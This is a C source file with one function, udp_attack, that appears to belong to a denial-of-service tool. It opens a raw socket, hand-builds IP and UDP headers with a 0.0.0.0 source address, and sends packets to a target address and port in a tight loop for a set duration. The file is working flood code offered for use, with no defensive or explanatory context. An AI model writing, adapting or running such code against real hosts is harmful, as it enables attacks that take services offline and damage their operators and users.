#include <string.h>
#include <time.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <unistd.h>
#include "udp_attack.h"
#include "checksum.h"
#include "attack_params.h"

void* udp_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    int udp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    char packet[4096];
    memset(packet, 0, 4096);

    struct iphdr* iph = (struct iphdr*) packet;
    struct udphdr* udph = (struct udphdr*) (packet + sizeof(struct iphdr));

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = params->target_addr.sin_port;
    dest.sin_addr = params->target_addr.sin_addr;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 32;
    srand(time(NULL));
    iph->id = htonl(rand());
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_UDP;
    iph->saddr = inet_addr("0.0.0.0");
    iph->daddr = params->target_addr.sin_addr.s_addr;

    udph->source = htons(12345);
    udph->dest = params->target_addr.sin_port;
    udph->len = htons(sizeof(struct udphdr) + 32);
    udph->check = 0;

    char data[32] = {0};

    time_t end_time = time(NULL) + params->duration;
    while (params->active && time(NULL) < end_time) {
        iph->check = generic_checksum((unsigned short*)packet, iph->tot_len);

        udph->check = tcp_udp_checksum(udph, sizeof(struct udphdr) + 32, iph->saddr, iph->daddr, IPPROTO_UDP);

        memcpy(packet + sizeof(struct iphdr) + sizeof(struct udphdr), data, 32);

        sendto(udp_sock, packet, iph->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
    }
    close(udp_sock);
    return NULL;
}
